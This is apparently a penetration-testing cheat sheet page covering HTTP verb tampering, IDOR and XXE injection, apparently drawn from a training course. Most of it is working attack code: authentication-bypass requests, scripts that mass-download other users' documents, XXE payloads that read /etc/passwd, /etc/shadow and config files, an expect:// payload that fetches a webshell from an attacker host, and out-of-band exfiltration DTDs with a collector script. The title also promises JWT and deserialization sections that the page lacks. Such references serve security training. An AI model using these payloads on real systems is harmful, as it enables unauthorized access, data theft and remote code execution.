---
title: "Web Attacks"
description: "IDOR, XXE, JWT attacks, and insecure deserialization."
sidebar:
  order: 9
  label: "Web Attacks"
---
> HTTP Verb Tampering to bypass authentication/filters; IDOR to access other users' resources; XXE to read local files and exfiltrate data via XML external entities.

---


## HTTP Verb Tampering

### Basic Auth Bypass (HEAD)

```bash
# Si GET / pide autenticación → probar HEAD (no envía body, a veces bypassea auth)
curl -s -I http://target/admin/       # HEAD request
curl -s -X HEAD http://target/admin/  # explícito

# En Burp: cambiar GET → HEAD en la request
# Si responde 200 en vez de 401 → auth bypassada

# Otros verbos a probar:
# OPTIONS, PUT, DELETE, PATCH, CONNECT, TRACE
```

### Filter Bypass (GET vs POST Inconsistency)

```bash
# Filtro solo bloquea $_POST["param"] en PHP
# Ejecutar la acción con el parámetro vía GET (usa $_REQUEST)
curl -s "http://target/action.php?param=malicious_value" -X POST

# En Burp:
# 1. Interceptar POST request
# 2. Mover el parámetro del body a la URL (query string)
# 3. O cambiar POST → GET/PUT completamente

# Ejemplo: bypass de filtro de caracteres en username
# POST body: username=a|b → bloqueado
# GET: ?username=a|b → pasa (si el filtro solo comprueba $_POST)
```

---

## IDOR — Insecure Direct Object Reference

### Basic Enumeration

```bash
# Parámetro numérico en URL
GET /documents.php?uid=1   # → cambiar a uid=2, uid=3...

# En APIs REST
GET /api/v1/users/1/profile
GET /api/v1/documents/1.pdf

# En body POST o JSON (buscar en Burp)
{"id": 1}
{"user_id": "abc123"}
```

### Decoding Obfuscated References

```bash
# Base64 → decodificar → modificar → recodificar
echo "MTIzNDU2" | base64 -d   # → 123456
echo -n "789" | base64         # → Nzg5

# MD5 de ID
echo -n "1" | md5sum           # → c4ca4238a0b923820dcc509a6f75849b
echo -n "2" | md5sum           # → c81e728d9d4c2f636f067f89cc14862c

# Base64 + MD5 combinado (como en el módulo):
echo -n "1" | base64 -w 0 | md5sum | tr -d ' -'
```

### Mass Enumeration — Documents by UID

```bash
# Script: descargar documentos de todos los UIDs
url="http://SERVER_IP:PORT"
for i in {1..20}; do
    for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
        wget -q "$url/$link"
    done
done
```

### Mass Enumeration — IDOR with Hash (base64+MD5)

```bash
url="http://SERVER_IP:PORT"
for i in {1..20}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" "$url/download.php"
    done
done
```

### Chaining IDOR — Privilege Escalation

```bash
# Step 1: GET to obtain UUID/profile data of your own profile
GET /api/v1/profile → {"uid":"a1b2c3","role":"user","username":"alice"}

# Step 2: PUT with UUID of another user + modified field
PUT /api/v1/profile
{"uid":"TARGET_UUID","role":"web_admin"}

# Step 3: verify access with the new role
GET /admin/dashboard
```

---

## XXE — XML External Entity Injection

### Initial Detection

```xml
<!-- Confirmar que las entidades se procesan: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY company "Inlane Freight">
]>
<root>
<email>&company;</email>
</root>
<!-- Si la respuesta muestra "Inlane Freight" → XXE procesado → vulnerable -->
```

### Reading Local Files

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
<name>test</name>
<email>&company;</email>
</root>
```

```bash
# Archivos clave a leer
file:///etc/passwd
file:///etc/shadow
file:///etc/hosts
file:///var/www/html/config.php
file:///var/www/html/index.php   # puede fallar si tiene caracteres XML especiales
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

### Reading PHP Source Code (php://filter)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
<email>&company;</email>
</root>
<!-- Decodificar el base64 en el output: echo '...' | base64 -d -->
```

### RCE via expect (if module is installed)

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://id">
]>
<root>
<email>&company;</email>
</root>

<!-- RCE completa: descargar webshell desde nuestro servidor -->
<!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
<!-- $IFS reemplaza espacios; evitar |, >, { en el comando -->
```

---

## Advanced XXE — CDATA (Files with Special Characters)

```bash
# Preparar DTD externo — xxe.dtd
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

```xml
<!-- Payload para el target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<root>
<email>&joined;</email>
</root>
<!-- Muestra el archivo completo sin romper el XML, incluso con < > & -->
```

---

## Blind XXE — Error-Based

```bash
# xxe.dtd en nuestro servidor
echo '<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '"'"'%nonExistingEntity;/%file;'"'"'>">
' > xxe.dtd
python3 -m http.server 8000
```

```xml
<!-- Payload: trigger del error que incluye el contenido del archivo -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
<root><email>test</email></root>
<!-- El error PHP incluirá el contenido de /etc/hosts en el mensaje de error -->
```

---

## Blind XXE — Out-of-Band (OOB) Exfiltration

```bash
# index.php en nuestro servidor — decodifica y muestra el archivo exfiltrado
cat > index.php << 'EOF'
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
EOF
php -S 0.0.0.0:8000
```

```bash
# xxe.dtd — exfiltrar via HTTP GET con contenido base64
cat > xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
EOF
```

```xml
<!-- Payload enviado al target -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
<!-- El target hace GET a nuestro servidor con el archivo en base64 -->
<!-- El index.php lo decodifica y lo muestra en los logs del server -->
```

### Automation with XXEinjector

```bash
# Instalar
git clone https://github.com/enjoiz/XXEinjector.git

# Preparar archivo de request (solo hasta la primera línea XML, luego XXEINJECT)
cat > /tmp/xxe.req << 'EOF'
POST /blind/submitDetails.php HTTP/1.1
Host: TARGET_IP
Content-Type: text/plain;charset=UTF-8

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
EOF

# Ejecutar — OOB con PHP filter
ruby XXEinjector.rb --host=OUR_IP --httpport=8000 \
  --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter

# Resultados en:
cat Logs/TARGET_IP/etc/passwd.log
```

---

## XXE — SSRF via External Entity

```xml
<!-- Escanear puertos internos / acceder a recursos internos -->
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://127.0.0.1:8080/">
]>
<!-- Si el servicio existe → responde en &company; -->
<!-- Si no → error o vacío -->
```

---

## Content-Type XML vs JSON

```bash
# Si el endpoint usa JSON pero puede aceptar XML:
# 1. Cambiar Content-Type a application/xml
# 2. Convertir el JSON a XML (herramienta online o manual)
# 3. Probar XXE — puede ser una superficie no testeada

# Herramienta: https://www.convertjson.com/json-to-xml.htm
```

---

## Pitfalls / Gotchas

- **Verb Tampering — HEAD vs GET:** HEAD is the most reliable for bypassing Basic Auth. The server processes the request but does not return a body; if there is no authentication check in the verb's handler, it succeeds.
- **Verb Tampering — $_POST vs $_REQUEST filter:** in PHP, `$_REQUEST` collects GET+POST+COOKIE. If the filter sanitizes `$_POST` and the action uses `$_REQUEST`, sending the parameter via GET bypasses the filter.
- **IDOR in AJAX:** search for calls to `/api/` in the frontend JS code. ID parameters often travel in the JSON body or in the URL path.
- **Hashed IDOR:** if the ID looks like MD5 or SHA, test whether it is the hash of a sequential numeric ID (1, 2, 3...) or a UUID.
- **XXE — entity not shown:** if there is no visible output field → blind. Use OOB before giving up.
- **XXE — PHP with special characters:** `file://` fails for PHP files containing `<?>`. Always use `php://filter/convert.base64-encode/resource=`.
- **XXE CDATA — internal and external entities cannot be mixed directly:** the solution is to use XML Parameter Entities (`%`) and an external DTD.
- **expect:// requires PHP module:** rarely enabled in production. Only use for RCE if the module is available (verify via LFI using `php.ini`).
- **OOB XXE and firewalls:** if the target server cannot make outbound HTTP connections → use DNS OOB as an alternative (subdomain = base64 data, capture with tcpdump).
- **XXEinjector — output in logs:** the tool does not print directly; check `Logs/TARGET_IP/`.
- **DoS by entity loop:** the "Billion Laughs" payload no longer works on modern servers (Apache/Nginx detect them). Do not waste time on this in production.

---

## 🛠️ Related Tools (pwnVader Ecosystem)

<aside class="my-6 p-4 rounded-md border-l-4 border-[#cba6f7] bg-[#cba6f7]/5 not-prose">
  <div class="text-[10px] uppercase tracking-widest text-[#cba6f7] font-bold mb-1">
    Tool · hacking.pwnvader.com
  </div>
  <p class="text-sm text-zinc-300">
    Are you analyzing JSON Web Tokens (JWT) or need to encode/decode complex payloads during your testing? Bypass access controls and manipulate signatures with the <a href="https://hacking.pwnvader.com/web/jwt" class="text-[#cba6f7] hover:underline">JWT Attacker</a>, or process advanced encoding recipes serverless-style with the <a href="https://hacking.pwnvader.com/encoders/recipes" class="text-[#cba6f7] hover:underline">Cyber Encoder Lab</a>.
  </p>
</aside>

---

## Related Cheatsheets

- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercepting and manipulating XML/HTTP requests with Burp
- [File Inclusion](/en/metodologias/web/file-inclusion/) — php://filter to read source, same wrapper as in XXE
- [SQL Injection Fundamentals](/en/metodologias/web/sql-injection-fundamentals/) — blind SQLi → same OOB logic as blind XXE
- [Cross-Site Scripting (XSS)](/en/metodologias/web/cross-site-scripting-xss/) — stored XSS can be combined with IDOR for higher impact
- [Attacking Common Applications](/en/metodologias/web/attacking-common-applications/) — XXE in SOAP APIs, WordPress, and third-party apps
